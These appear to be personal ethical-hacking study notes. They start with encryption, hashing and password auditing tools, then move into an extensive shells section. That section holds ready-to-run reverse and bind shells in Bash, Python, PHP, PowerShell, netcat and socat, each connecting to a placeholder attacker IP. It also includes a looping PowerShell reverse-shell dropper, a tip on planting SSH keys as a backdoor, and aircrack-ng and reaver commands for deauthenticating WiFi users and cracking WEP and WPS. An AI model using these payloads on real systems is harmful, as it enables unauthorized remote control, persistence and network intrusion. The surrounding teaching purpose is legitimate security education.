# CyberSecurity & Ethical Hacking

## Cryptography and Encryption

### Understanding Encryption

Cryptography & Encryption is the science of hiding data and making it available again. In cryptography, hiding data is called encryption and unhiding it is called decryption. When data is securely exchanged, it is first encrypted by the sender, and then decrypted by the receiver using a special key. For Instance, Computers encrypt using XOR is an operation that compares two bits and returns True (1) if only one of the bits is 1, and returns False (0), if the bits are the same value (both 0’s or both 1’s).

### Symmetric and Asymmetric Encryption

- **Symmetric encryption** uses the same key to both encrypt and decrypt data.
- **Asymmetric encryption** uses two different keys to encrypt and decrypt data. Asymmetric encryption is the most secure way to transmit data; however, it is slower and more complex than symmetric encryption. Therefore, it is primarily used to exchange smaller pieces of data. Encryption is the most powerful single tool for protecting networking network security, it’s technique include: “Link Encryption, End-to-End Encryption, VPNs, SSH encryption, Transport layer security(TLS), IP security protocol(IPsec), Signed Code, Encrypted Email.”

Asymmetric encryption uses a pair of keys, one to encrypt and the other in the pair to decrypt. Examples are RSA and Elliptic Curve Cryptography. Normally these keys are referred to as a public key and a private key. Data encrypted with the private key can be decrypted with the public key, and vice versa. Your private key needs to be kept private, hence the name. Asymmetric encryption tends to be slower and uses larger keys, for example RSA typically uses 2048 to 4096 bit keys.

## Hashing

Hashing is a one-way process that takes a piece of data of any size and uses a mathematical function(#function) to represent that data with a unique hash value of a fixed size. Hash functions are quite different from encryption. There is no key, You cannot compute the original data from its hash. Ideally, hash functions always generate unique values for different inputs data; when they don’t it’s called a Hash Collision. While it’s hypothetically possible to encounter a hash collision with nearly any hashing algorithm, with modern algorithms like SHA-256, it would take so long to result in a collision that it’s functionally impossible. Earlier hashing algorithms, like MD5 and SHA-1, are more likely to result in hash collisions.

Due to the pigeonhole effect, collisions are not avoidable. The pigeonhole effect is basically, there are a set number of different output values for the hash function, but you can give it any size input. As there are more inputs than outputs, some of the inputs must give the same output. If you have 128 pigeons and 96 pigeonholes, some of the pigeons are going to have to share. All hash functions have finite output sizes, yet infinitely many possible inputs.

It’s easy to get the hash value of some types data. If you are on a Unix-based(Mac) operating system, open your terminal and type:

```bash
echo "Hello World" | shasum -a 256
```

### Hash Function Characteristics

The cryptographic algorithm used must generate hashes that have the following characteristics:

- **Deterministic:** The same input should always produce the same hash.
- **Uncorrelated:** A small change in the input should generate a completely different hash. Avalanche Effect says that if any single bit changes in the preimage, it should trigger an "avalanche" that jumbles the other bits.
- **One-way:** It should be infeasible to reconstruct the data from the hash.
- **Unique:** Only one file can produce one specific hash.

The input to a hash function is usually called the preimage, while the output is often called a digest, or sometimes just a "hash."

Note: You can't encrypt the passwords, as the key has to be stored somewhere. If someone gets the key, they can just decrypt the passwords.

This is where hashing comes in. What if, instead of storing the password, you just stored the hash of the password?

## Rainbow Tables and Salts

Rainbow tables, massive tables of common passwords and password-hash combinations, speed up that process even more. However, It is practically impossible for an attacker to guess and match the hash of a complex password! What if two users have the same password? As a hash function will always turn the same input into the same output, you will store the same password hash for each user. That means if someone cracks that hash, they get into more than one account. It also means that someone can create a "Rainbow table" to break the hashes.

*Organizations can further protect hashed information by using something called a salt.
A SALT is a secret random string that is combined with a password prior to hashing specifically to defend against the use of rainbow tables*.

The salt is added to either the start or the end of the password before it’s hashed, and this means that every user will have a different password hash even if they have the same password.

In theory, you could use the same salt for all users but that means that duplicate passwords would still have the same hash, and a rainbow table could still be created specific passwords with that salt, which is why in practice they are randomly generated and stored in the database

Salts don’t need to be kept private.

##HashID & Automated Hash recognition
Unix style password hashes are very easy to recognise, as they have a prefix. The prefix tells you the hashing algorithm used to generate the hash. The standard format is $format$rounds$salt$hash
HashID is a tool written in Python 3 which supports the identification of over 220 unique hash types using regular expressions. Identify the different types of hashes used to encrypt data and especially passwords. A detailed list of supported hashes can be found here https://hashcat.net/wiki/doku.php?id=example_hashes
It is able to identify a single hash, parse a file or read multiple files in a directory and identify the hashes within them. hashID is also capable of including the corresponding Hashcat mode and/or JohnTheRipper format in its output.
 $YNTAX >> ./hashid.py or HASHID [-h] [-e] [-m] [-j] [-o FILE] [--version] INPUT
+---------------------------+-------------------------------------------------------+
| Parameter                 | Description                                           |
+===========================+=======================================================+
| INPUT                     | input to analyze (default: STDIN)                     |
+---------------------------+-------------------------------------------------------+
| -e, --extended            | list all hash algorithms including salted passwords   |
+---------------------------+-------------------------------------------------------+
| -m, --mode                | show corresponding hashcat mode in output             |
+---------------------------+-------------------------------------------------------+
| -j, --john                | show corresponding JohnTheRipper format in output     |
+---------------------------+-------------------------------------------------------+
| -o FILE, --outfile FILE   | write output to file (default: STDOUT)                |
+---------------------------+-------------------------------------------------------+
| --help                    | show help message and exit                            |
+---------------------------+-------------------------------------------------------+

**References:**
- [HashCat Wiki](https://hashcat.net/wiki/)
- [John The Ripper Info](https://www.openwall.com/john/)

### Hash Auditing & Recovery Tools

#### HashCat Usage

**HashCat Basic Concepts**
Hashcat is often used for password auditing and recovery. It supports various modes to test password strength.

| Mode | Hash-Type | Description |
| :--- | :--- | :--- |
| Wordlist | sha2-256 | Checks hashes against a list of words. |
| Wordlist + Rules | MD5 | Apply transformation rules to wordlist (e.g. `password` -> `P@ssw0rd`). |
| Brute-Force | MD5 | Try all character combinations (computationally expensive). |
| Combinator | MD5 | Combine words from dictionaries. |
| Association | $1$ | Combine words based on association rules. |

#### John The Ripper Usage

**John The Ripper (JTR)**
John the Ripper is a widely used password auditing tool. It is often used to check for weak passwords by System Administrators.
It operates in several modes:
- **Single Crack Mode**: Uses the username/GECOS info to guess passwords.
- **Wordlist Mode**: Uses a dictionary file.
- **Incremental Mode**: Tries all character combinations (Brute-force).

**Basic Syntax Concepts:**
```bash
john --wordlist=[path/to/wordlist] [password-file]
```
To list supported formats:
```bash
john --list=formats
```

### Password Mangling
Tools like John and Hashcat use "rules" or "mangling" to mutate dictionary words. This mimics common user behavior, such as capitalizing the first letter or adding digits at the end (e.g., "Welcome123"). 
This highlights why simple variations of common words are not secure.

### NTHash / NTLM
NTHash is the hash format used by modern Windows OS to store user passwords.
Auditors can interact with these hashes by dumping the SAM database or accessing NTDS.dit.

### Unshadowing
On Linux, user info is in `/etc/passwd` and password hashes are in `/etc/shadow` (readable only by root).
To audit these passwords, tools combine the files:
```bash
unshadow [passwd-file] [shadow-file] > [output-file]
```

unshadow - Invokes the unshadow tool
[path to passwd] - The file that contains the copy of the /etc/passwd file you've taken from the target machine
[path to shadow] - The file that contains the copy of the /etc/shadow file you've taken from the target machine 
> - This is the output director, we're using this to send the output from this file to the...
[output file] - This is the file that will store the output from 

“Note Redirect the output of unshadow to a txt file and then use JOHN with or without —format option flag to crack this”
unshadow local_passwd local_shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt 

Cracking a Password Protected Zip File & Rar File *JTR
Similarly to the unshadow tool that we used previously, we're going to be using the zip2john tool to convert the zip file into a hash format that John is able to understand, and hopefully use John to crack the password on password protected Zip files. Again, we're going to be using a separate part of the john suite of tools to convert the zip file into a format that John will understand, but for all intents and purposes, we're going to be using the syntax that you're already pretty familiar with by now. 
Rar2John Almost identical to the zip2john tool that we just used, we're going to use the rar2john tool to convert the rar file into a hash format that John is able to understand
The basic usage syntax is like this: zip2john [options] [zip file] > [output file]
The basic usage syntax is like this: rar2john [options] [zip file] > [output file]
[options] - Allows you to pass specific checksum options to zip2john, this shouldn't often be necessary
[zip file] - The path to the zip file you wish to get the hash of
> - This is the output director, we're using this to send the output from this file to the...
[output file] - This is the file that will store the output from 

“Note We're then able to take the file we output from zip2john in our example use case called "zip_hash.txt" and, as we did with unshadow, feed it directly into John as we have made the input specifically for it.
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt

Cracking SSH Key Passwords *JTR
Using John to crack the SSH private key password of id_rsa files. Unless configured otherwise, you authenticate your SSH login using a password. However, you can configure key-based authentication, which lets you use your private key, id_rsa, as an authentication key to login to a remote machine over SSH. However, doing so will often require a password- here we will be using John to crack this password to allow authentication over SSH using the key.  ssh2john converts the id_rsa private key that you use to login to the SSH session into hash format that john can work with. 
ssh2john [id_rsa private key file] > [hash output file]
ssh2john - Invokes the ssh2john tool
[id_rsa private key file] - The path to the id_rsa file you wish to get the hash of
> - This is the output director, we're using this to send the output from this file to the...
[output file] - This is the file that will store the output from 


## Wireless Network Security

### Network Segmentation

Network Segmentation is the basic practice of breaking apart larger networks into smaller, functionally similar networks with differ. In segmenting networks, we should consider:

- Which assets are we trying to protect?
- Who can access which networks?

These questions naturally lead us to access control lists that determine who can connect to which networks.

Often the first place people start is just implementing a guest network that’s separate from the rest of your network environment

### Access Point Placement

It is important we consider both the placement and strength of our access points. Access points are the systems and nodes used to distribute wireless signals. If an attacker can access the network, they may be able to attack the users on the network!

### Encryption

All wireless activity should be securely encrypted. Currently, the accepted standard for security is WPA2. WPA2-Personal will require a single password to access Wi-Fi, while WPA2-Enterprise will require multi-factor authentication.

It’s recommended to set your own network name and password when you set up your wireless Internet at home, instead of using the default one that comes with the router!

### Network Traffic Analysis

The ability to analyze network communications is crucial!

WireShark How to use: https://www.wireshark.org/docs/wsug_html_chunked/ChUseMainWindowSection.html

In order to analyze your traffic on Wireshark, we need to choose the correct Interface. Depending on your computer’s settings you are likely using either the Wi-Fi or Ethernet interface. If neither of those interfaces appears choose on the graph with the most activity. As soon as we chose an interface by double-clicking on it, we’ll see traffic start flooding in. While this may seem overwhelming, the key to network analysis is filtering out noise.

Personal Security Best Practices➡️Account Safety & Password Management
Today, there are common methods to guess passwords in a variety of ways, such as brute-forcing, credential stuffing, dictionary attacks, and rainbow tables.
ref(https://www.codecademy.com/courses/introduction-to-cybersecurity/articles/windows-hardening)
Hardening is the process of fortifying a system against attacks. When we harden computers, we are generally focused on fortifying the operating system, making sure that it is as secure as it can be.
Hardening is a balancing act: too little of it, and the computer is vulnerable to attacks, but too much hardening can make a computer impractical to use.
Computers are complicated machines. If we had to communicate with the hardware directly, we would never get anything done! That’s why computer scientists and engineers created operating systems. Operating systems (OS for short) are pre-loaded sets of software that handle the details of keeping a computer running, provide services to applications, and make it easy for us to interact with our computers. If the hardware of a computer is its brain, the operating system is its consciousness and also its protection from cyber attacks.


## Five Stages of Hacking

### Reconnaissance—Information Gathering

- Bugcrowd.com  Find Vulnerabilities Other Tools Miss
- Hunter.io Hunter lets you find professional email addresses in seconds
- Wappalyzer is a browser extension that uncovers the technologies used on websites. It detects content management systems, eCommerce platforms, web servers, JavaScript frameworks, analytics tools and many more.

### Scanning & Enumeration

- Gaining Access
- Maintaining Access
- Covering Tracks

## Malware

### Malware Types and Definitions

- **Malware:** Malicious-Software code inserted into a system to cause damage or gain unauthorized access to a network
- **Adware:** Unwanted software designed to throw advertisements on your screen
- **Virus:** A malicious self-replacing application that attaches itself to other programs and executables without the permission of the user
- **Worm:** Self-replicating code that copies itself from computer to computer without user intervention
- **Spyware:** Malicious code downloaded without a user’s authorization which is then used to steal sensitive information and relay it to an outside party in a way that harms the original user
- **Trojan Horse:** A type of contained, non-replicating malware that disguises itself as legitimate software in order to allow scammers and hackers access to a user’s system
- **Root-kit:** A collection of malicious programs that secretly provide continued, privileged access to a system for an unauthorized user/intruder
- **Ransomware:** Malicious code that will block a user’s access to data or threaten to publish sensitive data until they pay money to the malicious actor
- **File-less Malware:** A type of malware that ‘lives off the land’ and uses legitimate tools and the user’s operating system to perform malicious activities like privilege escalation, data collection, and more. It’s incredibly hard to detect and almost always missed by antivirus software.

## Phishing

Phishing is a type of social engineering attack that can take many forms. For example, vishing, (voice phishing), smishing (SMS phishing), and webpages that harvest credentials are all threats. Attackers can also send emails that look like they are from legitimate senders by using spoofing.   If the target is extremely sought after, like the CEO of a company, it is known as whaling.


## Shells and Footholds

### Understanding Shells

🕹What is a Shell - FOOTHOLD
In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common BASH or ZSH programs in Linux are examples of shells, as are Command-Prompt and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target. In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port connection on the server which we can connect to in order to execute further commands (a bind/Forward shell).
There are a variety of tools that can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system, such as NETCAT, SOCAT, Metasploit Modules—>multi/handler(Listens for Connections) & Msfvenom(Create Bind/Reverse Shell Payload).
Shells can be either interactive or non-interactive.
Interactive: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to interactive shells. These allow you to interact with programs after executing them. An interactive program, requires an interactive shell in order to run.
Non-Interactive shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Suffice to say that interactive programs do not work in non-interactive shells. 

### Shell Types: Bind and Reverse

Bind shells -> When the Payload code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the above to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. 

### Netcat for Shell Connections

NETCAT (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP. The command is designed to be a dependable back-end that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and investigation tool, since it can produce almost any kind of connection its user could need and has several built-in capabilities. Its list of features includes port scanning, transferring files, and port listening: as with any server, it can be used as a backdoor.
    -l is used to tell netcat that this will be a listener
    -v is used to request a verbose output
    -n tells netcat not to resolve host names or use DNS. 
    -p indicates that the port specification will follow.
If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. 

### Shell Upgrade Techniques

#### Bash Reverse Shell Connection

A.	The payload you've mentioned is used to create a reverse shell, which is a method for establishing a connection back to your machine from a target system. This can be particularly useful in situations(especially exploiting Webservers) where you have an unstable or non-interactive shell on the target and need a more stable and interactive environment. This setup assumes you have a listener set up on your machine at the specified IP and port (e.g., using `nc -lvp 443`) to accept the incoming connection. Once executed, the target machine will initiate a connection to your listener, giving you Partially-Interactive control over the shell. However, this type of shell might not be fully stable or fully interactive in terms of handling terminal input/output correctly, especially for programs that require full terminal capabilities (like `vi`, `top`, etc.).

Here’s a breakdown of the command: ### `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`
- bash -c: This instructs the Bash shell to read commands from the following string in form of a command line argument similar to Python -c
This allows you to execute a sequence of commands directly from the command line without needing to write them into a script file.
- bash -i: This initiates a new instance of Bash with the `-i` option to force it to run in interactive mode, which allows for an interactive shell session.
- >& /dev/tcp/{your_IP}/443: This part redirects both stdout (standard output) and stderr (standard error) to a TCP connection to the specified IP address (`{your_IP}`) on port 443. The `/dev/tcp/host/port` is a special file used by Bash to handle TCP connections.
- 0>&1: This redirects stdin (standard input) to the same destination as stdout. Essentially, this connects the input of the shell to the TCP stream, allowing commands to be sent remotely.

####  What Happens When You Run This Command in a Reverse Shell? 
- Direct Connection: By creating a direct TCP connection to a listening port on your machine, you bypass potential restrictions or issues with the initial shell environment.
- Interactive Mode: Running Bash in interactive mode ensures that the shell behaves more like a normal terminal, supporting job control, aliases, and more.
- Unified Input/Output Redirection: Redirecting stderr and stdout together to the remote connection helps ensure that all output is captured remotely, making debugging and interaction easier.


#### Python Shell Upgrade

B.	The command python -c 'import pty; pty.spawn("/bin/bash")' is used in the context of a reverse shell to upgrade the partial-interactive shell you have obtained on a remote system to a fully interactive shell. Here's what each part does:

1. python3 -c: This part tells the system to execute the following Python code as a one-liner command. The `-c` option allows you to run a Python script in the form of a command line argument. This allows you to execute a sequence of commands directly from the command line without needing to write them into a script file
2. import pty: This imports the Python module `pty`. The `pty` module defines operations for handling pseudo-terminal concepts, providing an interface to the pseudo-terminal devices supported by Unix (and Unix-like) systems.
3. pty.spawn("/bin/bash"): This function spawns a new process running the executable specified—in this case, `/bin/bash`. Essentially, it starts a new bash shell session.

### How It Enhances Stability and Interactivity:
- Upgraded Interactive Shell: Normally, when you get a reverse shell, it might be limited in functionality. For example, certain interactive commands like `vi`, `top`, or even `clear` might not work properly. By using `pty.spawn("/bin/bash")`, you are essentially upgrading your shell to a fully interactive bash session that can handle these commands correctly.
- Terminal Control: It allocates a pseudo-terminal (PTY) for the shell session, which means it behaves more like a normal terminal interface/window. This is crucial for interacting with programs that require a Terminal Environment/TTY (teletypewriter). 
- Improved User Experience: With a PTY, the shell environment becomes more user-friendly, supporting job control, proper signal propagation, and keyboard shortcuts (like Ctrl + C to terminate processes).
This command is particularly useful in scenarios where you have gained access through a simplistic shell that lacks full terminal capabilities. Upgrading to a fully interactive shell allows for more complex operations and a better overall experience while managing the server via a reverse shell.


### Conclusion -> Both commands are good for chaining. Combining these two commands can be highly effective: The first command establishes the initial connection and gives you basic interactivity. The second command upgrades the shell to a fully interactive one, enhancing your ability to interact with the system. Using both in sequence provides a robust method for managing remote systems through reverse shells, especially when dealing with unstable or non-interactive environments initially.
1. **Establish a Reverse Shell**: First, use the Bash reverse shell command to gain initial access.
2. **Upgrade the Shell**: Once you have the reverse shell, send the Python command to upgrade to a fully interactive shell.
#### Example Sequence
1. Start a listener on your local machine:
   ```bash
   nc -lvnp 443
   ```  
2. Execute the reverse shell from the target machine:
   ```bash
   bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
   ```
3. Once you have the shell, upgrade it:
   ```bash
   python -c 'import pty; pty.spawn("/bin/bash")'
   ```

#### PowerShell Reverse Shell

C.	 # PowerShell can be crafted to simulate a reverse shell, which connects back to an attacker-controlled server, allowing command execution. This is analogous to the Bash reverse shell example without the Python Part. For a proof of concept (PoC) to demonstrate an exploit on a webserver hosted in a Windows environment, directly translating the Bash and Python one-liners might not work effectively due to differences in underlying operating systems and available tools. Instead, you can use PowerShell or other native Windows functionalities to create a similar impact
$IP = "attacker_IP"  # Replace with the IP address of the attacker's machine
$Port = 443          # Port number on which the attacker's listener is running
try {
    $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
    $stream = $client.GetStream()
    [byte[]]$buffer = 0..65535|%{0}

    # Loop to read commands from the TCP connection and execute them
    while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
        $command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i)
        $output = Invoke-Expression $command 2>&1 | Out-String
        $response = ($output + "PS " + (pwd).Path + "> ")
        $sendBytes = ([text.encoding]::ASCII).GetBytes($response)
        $stream.Write($sendBytes,0,$sendBytes.Length)
        $stream.Flush()  
    }
    $client.Close()
} catch {
    Write-Output "Error: $_"
}

Example Command to Create the Script Directly on the Target:
Set-Content -Path "C:\Users\Public\revshell.ps1" -Value @"
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("YOUR_IP", YOUR_PORT);
        $stream = $client.GetStream();
        [byte[]]$bytes = 0..65535|%{0};
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String );
            $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
            $stream.Write($sendbyte,0,$sendbyte.Length);
            $stream.Flush();
        }
        $client.Close();
        Start-Sleep -Seconds 10;
    } catch {
        Start-Sleep -Seconds 10;
    }
}
"@

#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well. To receive the connection from the PowerShell reverse shell, you should set up a listener on the specified IP and port on your (the attacker's) machine. You can use netcat for this purpose: nc -lvnp 443

$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP", YOUR_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
$sm=(New-Object Net.Sockets.TCPClient("YOUR_IP", YOUR_PORT)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}

### Shell Implementation Examples

Below are Simplified code snippets for both a bind shell and a reverse shell in PHP, Python, Powershell, CMD, BASH. These snippets will focus on the core functionality needed to start a simple shell and make it interactive. Credit should be given to Metasploit Team, as i scorched through their codes to find the exact snippets that run bind and reverse shells
Reference Location:https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/payload && https://github.com/rapid7/metasploit-framework/tree/master/modules/payloads


### Python Bind Shell
```python
import socket, subprocess, os

# Set up listening socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 443))
s.listen(1)
conn, addr = s.accept()

# Execute commands
while True:
    data = conn.recv(1024)
    if data.decode().strip() == 'exit': break
    proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = proc.stdout.read() + proc.stderr.read()
    conn.send(output)

conn.close()
```

### Python Reverse Shell
```python
import socket, subprocess, os

# Connect to attacker's server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{your_IP}', 443))

# Execute commands
while True:
    data = s.recv(1024)
    if data.decode().strip() == 'exit': break
    proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = proc.stdout.read() + proc.stderr.read()
    s.send(output)

s.close()
```

### PHP Bind Shell
```php
<?php
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($sock, "0.0.0.0", 443);
socket_listen($sock);

$client = socket_accept($sock);

// Handle incoming commands
while(($input = socket_read($client, 1024)) !== false) {
    if(trim($input) == 'exit') break;
    $output = shell_exec($input);
    socket_write($client, $output);
}

socket_close($client);
socket_close($sock);
?>
```

### PHP Reverse Shell
```php
<?php
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($sock, '{your_IP}', 443);

// Handle commands from the server
while(($input = socket_read($sock, 1024)) !== false) {
    if(trim($input) == 'exit') break;
    $output = shell_exec($input);
    socket_write($sock, $output);
}

socket_close($sock);
?>
```

### PowerShell Bind Shell
```powershell
# Listen on port 443
$listener = [System.Net.Sockets.TcpListener]443
$listener.Start()
$client = $listener.AcceptTcpClient()

$stream = $client.GetStream()
$writer = new-object System.IO.StreamWriter($stream)
$reader = new-object System.IO.StreamReader($stream)
# Execute commands
while (($cmd = $reader.ReadLine()) -ne "exit") {
    $output = iex $cmd 2>&1
    $writer.WriteLine($output)
    $writer.Flush()
}

$client.Close()
$listener.Stop()
```

### PowerShell Reverse Shell
```powershell
$ip = "{your_IP}"
$port = 443
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = new-object System.IO.StreamWriter($stream)
$reader = new-object System.IO.StreamReader($stream)

# Send commands output back to attacker
while (($cmd = $reader.ReadLine()) -ne "exit") {
    $output = iex $cmd 2>&1
    $writer.WriteLine($output)
    $writer.Flush()
}
$client.Close()
```

### CMD.exe Bind Shell
```batch
@echo off
rem Listening on port 443
nc -lvp 443 -e cmd.exe
```
### CMD.exe Reverse Shell
```batch
@echo off
rem Replace {your_IP} with the IP address of the attacker's machine
nc {your_IP} 443 -e cmd.exe
```

### Bash Bind Shell
```bash
# Listen on port 443
nc -lvp 443 -e /bin/bash
```
### Bash Reverse Shell
```bash
# Replace {your_IP} with the IP address of the attacker's machine
nc {your_IP} 443 -e /bin/bash
```

### Notes
- **PowerShell**: Uses .NET classes to create TCP connections and execute commands.
- **CMD.exe**: Utilizes `nc` (Netcat), a networking utility for reading from and writing to network connections using TCP or UDP. It is assumed to be installed on the system.
- **Bash**: Also uses `nc` for creating simple TCP connections.
- **Python**: The code uses `subprocess` to execute commands and communicate back the results.
- **PHP**: Uses `socket` functions to create TCP connections and `shell_exec` to run commands.
- **Customization**: Replace `{your_IP}` with your actual IP address where the server-side script is listening.


  
       SOCAT REVERSE SHELL
run below command on attacker’s terminal to start a socat listener 
socat TCP-L:4444 -  
run below command on target’s terminal to connect back to socat listener 
socat TCP:<Attacker_IP>:4444 EXEC:"bash -li"  

        SOCAT BIND SHELL
run below command on target’s terminal
socat TCP-L:4444 EXEC:"bash -li"
run below command on attacker’s terminal
socat TCP:<Target_IP>:4444 - 

      The special command
run below command on attacker’s terminal
socat TCP-L:4444 FILE:`tty`,raw,echo=0  
run below command on target’s terminal
socat TCP:<Attacker_IP>:4444 EXEC:"bash -li",pty,stderr,sigint,setsid,sane  

The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:
pty, allocates a pseudoterminal on the target -- part of the stabilisation process
stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
setsid, creates the process in a new session
sane, stabilises the terminal, attempting to "normalise" it.

SSH keys are an excellent way to “upgrade” a reverse shell, assuming the user has login enabled (www-data normally does not, but regular users and root will). Leaving an SSH key in authorized_keys on a box can be a useful backdoor, and you don't need to deal with any of the issues of unstabilised reverse shells like Control-C or lack of tab completion.


## Pre-Connection Attacks(WIRELESS-HACKING) Use of Wireless Adapters 
WiFi adapter that supports monitor mode(In wireless technology, the equivalent to a NIC (network interface card) set to promiscuous mode. 
'Promiscuous' is a mode which some NICs can assume that would allow them to receive any packet that comes their way regardless of that packet's destination address. By default, NICs are supposed to discard all packets not addressed to them. Obviously, you'll want your NIC to be set to 'promiscuous' if you want to do any sniffing.. This enables us to sniff, capture and manipulate all wireless network traffic & packets transmitted by nearby devices and networks. Without this ability, we are limited to using our WiFi adapter to only connect to wireless Access Points (APs) that accept and authenticate us) and packet injection(A way to disrupt and manipulate network communication by allowing one to craft and inject malicious packets that appear as normal packets to the network. Most WiFi attacks require that we are able to inject packets into the AP while, at the same time, capturing packets going over the air).
“RealTek RTL8812AU & Atheros AR9271” chip Supporting 2.4ghz & 5ghz frequency bands #Brand is Irrelevant.”

*Kill Processes first using Syntax —> airmon-ng check kill
*Enable Monitor mode SYntax—>airmon-ng start [interfaceName] 
*To enable scans —>airodump-ng [interfaceName]
*To enable 5ghz bands —>airodump-ng —band a [interfaceName]
*to enable multiple bands(2.4&5ghz)—> airodump-ng —band abg [interfaceName]
*To target a specific network, airodump-ng help and check the filter options 
airodump-ng --bssid [MAC.addr] --channel [??] --write filename [interfaceName]  
*Open the filename in wirecap and Analyze the file
*Deauthenticating Users on an Access Point—>
aireplay-ng --deauth #packets -a target.mac.addr -c  connected.target.mac.addr [interfaceName]
Deauthenticate the main network aireplay-ng --deauth #packets -a target.mac.addr [interfaceName]
*https://askubuntu.com/questions/393300/changing-adapter-back-to-manged-mode

You can use the following command to change your wireless adapter to monitor mode using netsh:
netsh interface set interface name="Wi-Fi" admin=disable && netsh interface set interface name="Wi-Fi" admin=enable && netsh wlan set interface name="INTERFACE_NAME" mode=monitor
This command will disable and enable the Wi-Fi adapter and then set it to monitor mode. Please replace “Wi-Fi” with the name of your wireless adapter.

*WEP(Wired equivalent privacy) encryption & cracking uses an algorithm called RC4, clients encrypts each data packets/frame using a unique key stream(i.e Random initialization vector is used to generate this key streams i.e I.V. + password = key stream) and it’s decrypted by the router and vice versa. 
- To crack WEP, we need to Capture a large number of packets(I.e 10^6 frames) & Analyze the captured IVs and crack the key. However if the network Is not busy, it’ll take some time to capture enough IVs, to solve this we need to force the access points to generate new IVs. *We can’t communicate or connected with this AP, no attack can be initiated until we associate with the AP.
*To capture large packets we use airodump-ng specifically for that network—> airodump-ng --bssid [MAC.addr] --channel [??] --write filename wlan0mon
Note, You need to capture at least 5000IVs or
* We first associate with the network using a fake authentication—> aireplay-ng --fakeauth 0 -a target.mac.addr -h interface.mac.addr [interfaceName]
* Next we create more packets using ARPreplay attack—> aireplay-ng --arpreplay -b target.mac.addr -h interface.mac.addr wlan0mon
*Analyse the captured IVs & crack the key using aircrack-ng—> 
aircrack-ng filename.cap  

*WPA/WPA2(Wi-Fi Protected Access) made to address the issues in WEP, much more secure, each packet is encrypted using a unique temporary key, packets contain no useful info.  Employs a per-packet key, meaning that it dynamically generates a new 128-bit key for each packet(I.e packet frames looks different block by block) and thus prevents the types of attacks that compromised WEP
WPS is a feature that can be used with WPA/WPA2….allows clients to connect without the password, authentication is done using an 8-digit pin, this pin can be used to compute the actual password using several combo from a wordlists attack, this only works if the router is *not configured* to use PBC-public auth.
- To exploit this feature & crack this WPS non-configured PBC Access Point, first we find wps access points around us—>wash --interface [interfaceName]
- Next we use a fake authentication using exact same syntax as WEP above except instead of 0secs we use 30sec or thereabouts. but before we execute we use a program called reaver —> reaver --bssid target.mac.addr --channel # --interface [interfaceName] -vv —no-associate
- Execute/associate with the network using fake-auth while reaver operates—> aireplay-ng --fakeauth 0 -a target.mac.addr -h interface.mac.addr [interfaceName]
However if WPS is disabled or router is configured to use PBC
- we need to capture the “handshake” packets. The handshake does not contain data that helps recover the WPA key, it contains data can be used to check if a key is valid or not. 
